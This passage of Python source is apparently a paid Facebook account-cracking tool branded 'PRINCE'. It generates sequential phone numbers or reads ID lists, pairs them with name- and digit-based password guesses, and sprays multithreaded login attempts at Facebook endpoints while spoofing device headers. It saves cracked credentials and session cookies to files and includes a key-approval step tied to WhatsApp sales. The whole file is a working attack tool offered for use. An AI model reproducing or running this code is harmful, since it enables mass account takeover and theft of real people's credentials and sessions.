shuffled_cid = shuffle_string(ran_string)

random_string = generate_random_string(lowercase_count, numeric_count)
shuffled_connection_token = shuffle_string(random_string)

oks = []
loop = 0


def file_sub(uid, pwx, name, meth, fl):
    global oks, loop
    try:
        if meth in ["a", "A", "1"]:
            uax = ua[0]
        elif meth in ["b", "B", "2"]:
            uax = ua[1]
        elif meth in ["c", "C", "3"]:
            uax = ua[2]
        elif meth in ["d", "D", "4"]:
            uax = ua[3]
        elif meth in ["e", "E", "5"]:
            uax = ua[4]
        elif meth in ["f", "F", "6"]:
            uax = ua[5]
        elif meth in ["g", "G", "7"]:
            uax = ua[6]
        else:
            uax = ua[7]

        sys.stdout.write(
            f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}\r\r"),
        sys.stdout.flush()
        First = name.split(" ")[0]
        try:
            Last = name.split(" ")[1]
        except:
            Last = "khan"
        for pw in pwx:
            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
                                                                                          First.upper()).replace(
                "LAST", Last.upper())

            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi = str(uuid.uuid4())
            try:
                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
                device = uax.split("FBDV/")[1].split(";")[0]
                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
                fban = uax.split("FBAN/")[1].split(";")[0]
                fbpn = uax.split("FBPN/")[1].split(";")[0]
                fbav = uax.split("FBAV/")[1].split(";")[0]
                fbbd = uax.split("FBBD/")[1].split(";")[0]
                model = dd(fbbd, device)
                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
                    random.choice(["2", "1", "0"]))
                nowandroidv = uax.split("Android ")[1].split(";")[0]
                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
                    fbav, fbverson).replace(device, model)
            except:
                useragent = uax
                model = uax.split("FBDV/")[1].split(";")[0]
            data = {
                "adid": adi,
                "format": "json",
                "device_id": adi,
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": token,
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': useragent,
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Connection': 'close',
                'cache-control': 'no-cache',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
                'X-fb-device-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': f'{shuffled_connection_token}', }
            url = 'https://graph.facebook.com/auth/login'

            rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
            if "session_key" in rq:
                coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                oks.append(uid)

                break
            elif "Please Confirm Email" in str(rq):
                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                oks.append(uid)

                break
            else:
                continue
    except Exception as e:
        time.sleep(30)
    finally:
        loop += 1


def file_subind(uid, pwx, name, meth, fl):
    global oks, loop
    try:
        if meth in ["a", "A", "1"]:
            uax = ua[0]
        elif meth in ["b", "B", "2"]:
            uax = ua[1]
        elif meth in ["c", "C", "3"]:
            uax = ua[2]
        elif meth in ["d", "D", "4"]:
            uax = ua[3]
        elif meth in ["e", "E", "5"]:
            uax = ua[4]
        elif meth in ["f", "F", "6"]:
            uax = ua[5]
        elif meth in ["g", "G", "7"]:
            uax = ua[6]
        else:
            uax = ua[7]

        sys.stdout.write(
            f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}\r\r"),
        sys.stdout.flush()
        First = name.split(" ")[0]
        try:
            Last = name.split(" ")[1]
        except:
            Last = "khan"
        for pw in pwx:
            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
                                                                                          First.upper()).replace(
                "LAST", Last.upper())

            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi = str(uuid.uuid4())
            try:
                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
                device = uax.split("FBDV/")[1].split(";")[0]
                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
                fban = uax.split("FBAN/")[1].split(";")[0]
                fbpn = uax.split("FBPN/")[1].split(";")[0]
                fbav = uax.split("FBAV/")[1].split(";")[0]
                fbbd = uax.split("FBBD/")[1].split(";")[0]
                model = dd(fbbd, device)
                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
                    random.choice(["2", "1", "0"]))
                nowandroidv = uax.split("Android ")[1].split(";")[0]
                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
                    fbav, fbverson).replace(device, model)
            except:
                useragent = uax
                model = uax.split("FBDV/")[1].split(";")[0]
            with requests.Session() as session:
                data = {"adid": adi,
                        "format": "json",
                        "device_id": adi,
                        "cpl": "true",
                        "family_device_id": adi,
                        "secure_family_device_id": adi,
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "account_recovery",
                        'sim_serials': "['80973453345210784798']",
                        'openid_flow': 'android_login',
                        'openid_provider': 'google',
                        "email": uid,
                        "password": ps,
                        "access_token": token,
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "V2_UNTAGGED",
                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                        "advertiser_id": adi,
                        "currently_logged_in_userid": "0",
                        "locale": "en_US",
                        "client_country_code": "US",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                content_lenght = "&".join(["%s=%s" % (key, value) for key, value in data.items()])
                headers = {'User-Agent': useragent,
                           'Content-Type': 'application/x-www-form-urlencoded',
                           'x-fb-Connection-Type': 'MOBILE.LTE',
                           'Accept': '*/*',
                           'Host': 'graph.facebook.com',
                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                           'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                           'Priority': 'u=3,i',
                           'Zero-Rated': '0',
                           'X-Fb-Connection-Quality': 'GOOD',
                           'X-FB-Friendly-Name': 'authenticate',
                           'X-FB-Request-Analytics-Tags': 'graphservice',
                           'X-Fb-Device-Group': '5120',
                           'X-FB-HTTP-Engine': 'Liger',
                           'X-FB-Client-IP': 'True',
                           'X-FB-Server-Cluster': 'True',
                           'Content-Length': str(len(content_lenght))}
                q = session.post("https://b-api.facebook.com/auth/login", data=data, headers=headers,
                                 allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                    princeb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/",
                                                                                                                "-");
                    cookie = f"sb={princeb};{ckkk}"
                    print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]    {uid}|{ps}")
                    open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + cookie + "\n")
                    oks.append(uid)

                    break

                elif 'www.facebook.com' in q['error']['message']:
                    pass
                else:
                    continue
    except Exception as e:
        time.sleep(30)
    finally:
        loop += 1


def filee():
    global oks, loop
    pwx = []
    sort.clear()
    sort.logo()
    print("[b]    [red1]Option 1 [chartreuse1] [spring_green1]BD FILE Clone")
    print("[b]    [red1]Option 2 [chartreuse1] [spring_green1]IND/PAK FILE Clone")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m    ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m -> \x1b[38;0;196m ")
    print(sort.line())
    print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] "
          "/sdcard/id.txt")
    path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m-> \x1b[1;97m   "))
    print(sort.line())
    try:
        with open(path, "r") as file:
            fl = file.read().splitlines()
    except Exception as e:
        print("Error:", e)
        filee()
    limit = input("Password Limit -> ")
    print(sort.line())
    for i in range(int(limit)):
        print(
            " [b] [chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
        passw = str(input(f" \x1b[38;1;198m  \x1b[38;5;155mPass No-{i + 1} Add Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
        if passw not in pwx:
            pwx.append(passw)
        print(sort.line())
    print("  [r dark_olive_green1]N1[/r dark_olive_green1][b violet] Method 1")
    print("  [r dark_olive_green1]N2[/r dark_olive_green1][b violet] Method 2")
    print("  [r dark_olive_green1]N3[/r dark_olive_green1][b violet] Method 3")
    print("  [r dark_olive_green1]N4[/r dark_olive_green1][b violet] Method 4")
    print("  [r dark_olive_green1]N5[/r dark_olive_green1][b violet] Method 5")
    print("  [r dark_olive_green1]N6[/r dark_olive_green1][b violet] Method 6")
    print("  [r dark_olive_green1]N7[/r dark_olive_green1][b violet] Method 7")
    print("  [r dark_olive_green1]N8[/r dark_olive_green1][b violet] Method 8")
    print(sort.line())
    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m-> \x1b[1;97m   "))
    print(sort.line())
    with ThreadPool(max_workers=45) as sub:
        sort.clear()
        print(sort.logo())
        print(
            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] {str(len(pwx))}")
        print(sort.line())
        try:
            for xd in fl:
                uid = xd.split("|")[0]
                name = xd.split("|")[1]
                if ask in ["1", "a", "A", "01"]:
                    sub.submit(file_sub, uid, pwx, name, meth, fl)
                else:
                    sub.submit(file_subind, uid, pwx, name, meth, fl)

        except:
            pass
    print("\r\r" + sort.line())
    print(f"  Π! Total OK id : {str(len(oks))}")
    print(f"  Π! Save  /sdcard/PRINCEFILE-OK.txt ")
    print(sort.line())
    sys.exit()


def ran():
    pwx=[]
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]IND Number Clone")
    print("[b]    [red1][B] [spring_green1]BD Number Clone")
    print("[b]    [red1][C] [spring_green1]NEPAL Number Clone")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m -> \x1b[38;0;196m ")
    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
        print(sort.line())
        print(
            "[b]     [red1]✗ [chartreuse1] Without country code 10 digit EX [orange3]▶  [chartreuse1]6293799675, 7012878836")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(int(code) + i)
            user.append(data)
    elif ask in ["2", "02", "b", "B"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Type A BD 11 Digit Number  [orange3]▶  [chartreuse1]01710185019")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        # for i in range(limit):
        #     data = str(random.choice(range(1000000, 9999999)))
        #     user.append(data)
        for i in range(limit):
            data = str(int(code) + i)
            user.append(data)
    else:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]NEPAL Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Type A Sim CODE [orange3]▶  [chartreuse1]9828 9815 9813 9818 9819")
        code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        for mbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
    passlimit = input("Password Limit -> ")
    print(sort.line())
    for i in range(int(passlimit)):
        print(
            " [b] [chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] first8, last8, last6, jannat etc")
        passw = str(input(f" \x1b[38;1;198m  \x1b[38;5;155mPass No-{i + 1} Add Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
        if passw not in pwx:
            pwx.append(passw)
        print(sort.line())
    print("  [r dark_olive_green1]N1 -> [/r dark_olive_green1][b violet] Method 1")
    print("  [r dark_olive_green1]N2 -> [/r dark_olive_green1][b violet] Method 2")
    print("  [r dark_olive_green1]N3 -> [/r dark_olive_green1][b violet] Method 3")
    print("  [r dark_olive_green1]N4 -> [/r dark_olive_green1][b violet] Method 4")
    print("  [r dark_olive_green1]N5 -> [/r dark_olive_green1][b violet] Method 5")
    print("  [r dark_olive_green1]N6 -> [/r dark_olive_green1][b violet] Method 6 (Best For Robi And Airtel)")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if meth in ["1", "a", "A"]:
        fb = "m"
    elif meth in ["2", "b", "B"]:
        fb = "x"
    elif meth in ["3", "c", "C"]:
        fb = "p"
    elif meth in ["4", "d", "D"]:
        fb = "touch"
    elif meth in ["5", "e", "E"]:
        fb = "free"
    else:
        fb = "mbasic"

    with ThreadPool(max_workers=20) as heron:
        
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
        print(sort.line())
        for xd in user:
            if ask in ["1", "01", "a", "A"]:
                uid = "91" + xd
            elif ask in ["2", "02", "b", "B"]:
                uid = "0" + xd
            else:
                uid = code + xd
            
            heron.submit(ren_sub, uid, pwx, meth, user, fb)


def ren_sub(uid, pwx, meth, user, fb):
    global oks, loop, ugen
    shadid = random.choice(sys_ua)
    uagent = random.choice(ugen)
    session = requests.Session()
    sys.stdout.write(
        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}\r\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            ps = pw.replace("first8", uid[:8]).replace("last8",uid[-8:] ).replace("last11", uid[:11]).replace(
                "first11", uid[:11]).replace("first6",uid[:6] ).replace("last6", uid[-6:]).replace("first7", uid[:7]).replace(
                "last7",uid[-7:] ).replace("first9", uid[:9]).replace("last9",uid[-9:] ).replace("first10", uid[:10]).replace("last10",uid[-10:] )
                
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                    "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
            uax = uagent
            
            ver1 = str(random.randrange(1, 99))
            ver2 = str(random.randrange(90, 121))
            lsd = lsb()
            refer = referer()
            dpr = str(random.randrange(2, 6))
            sceme = random.choice(['light', 'dark'])
            had = {
                'Host': f'{fb}.facebook.com',
                'content-length': str(random.randrange(1600, 1800, 10)),
                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                'sec-ch-ua-mobile': '?1',
                'user-agent': uax,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd,
                'viewport-width': '360',
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': dpr,
                'sec-ch-ua-full-version-list': '',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': sceme,
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': f'https://{fb}.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                'accept-encoding': 'gzip, deflate, br,',
                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url, data=info, headers=had)
            heron_brand = session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                xx = coki.split("c_user=")[1]
                xd = xx[:15]
                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[🍪][spring_green1]{coki}")
                open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                oks.append(xd)
                break
                
                
                        
                


            elif "checkpoint" in heron_brand:
                # coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                #print(f"\r\r[green] [CP-ID] {uid} | {ps} ")
                cp.append(uid)
                open("/sdcard/SD-CP.txt", "a").write(uid + "|" + ps + "\n")
                pass
            else:
                continue
        loop += 1
    except Exception as e:
        time.sleep(30)

#res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
def main():
    info()
    sort.clear()
    sort.logo()
    print(
        "[b]    [red1][A] [chartreuse1]File Clone [blue][[green]B[red1]D[blue]-[orange1]I[white]N[bright_green]D[blue]]")
    print("[b]    [red1][B] [spring_green2]Old Uid Clone")
    print("[b]    [red1][C] [spring_green1]Random (more..2)")

    print(sort.line())
    fast_choice = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if fast_choice in ["1", "01", "a", "A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]File Clone")
        print(sort.line())
        time.sleep(2)
        filee()
    elif fast_choice in ["2", "02", "b", "B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Old Uid Crack")
        print(sort.line())
        time.sleep(2)
        old()
    elif fast_choice in ["3", "03", "c", "C"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Random Crack")
        print(sort.line())
        time.sleep(2)
        ran()
    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        main()


def login(uid, meth):
    global oks, loop
    Session = requests.session()
    try:
        sys.stdout.write(
            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789"]:
            if meth in ["1", "01", "A", "a"]:
                agent = uaxxxx()
            else:
                agent = Samsung()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(200000000, 300000000)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": agent,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"}
            rp = Session.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break

            else:
                continue
        loop += 1
    except:
        time.sleep(30)


K1 = str(os.getuid())
K2 = str(os.getgid())
num_key = "".join(K1 + K2)

cm = num_key.encode("ASCII")
cmr = base64.b64encode(cm)
cm2 = str(cmr).upper().replace("B", "$")
showkey = cm2.replace("'", "").replace("==", "")


def approve():
    url = "https://github.com/Shadid21/Prince/blob/main/approval.txt"  # Your Link
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax = buffer.getvalue().decode('utf-8')
    except:
        sys.exit("[!!] Internet Error...")

    if showkey in datax:
        sort.clear()
        print("Checking Subscription")
        time.sleep(3)
        os.system("xdg-open https://chat.whatsapp.com/EYxDWylkPRq63C5C2rWuJK")
        main()
    else:
        os.system("xdg-open https://chat.whatsapp.com/EYxDWylkPRq63C5C2rWuJK")
        sort.logo()

        print("your Key ->   " + showkey)
        input("This is paid tool bro. If you want to buy press enter. ")
        tks = (f'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20 {showkey}')
        os.system('am start https://wa.me/+8801617687239?text=' + tks)
        sys.exit()


if __name__ == "__main__":
    approve()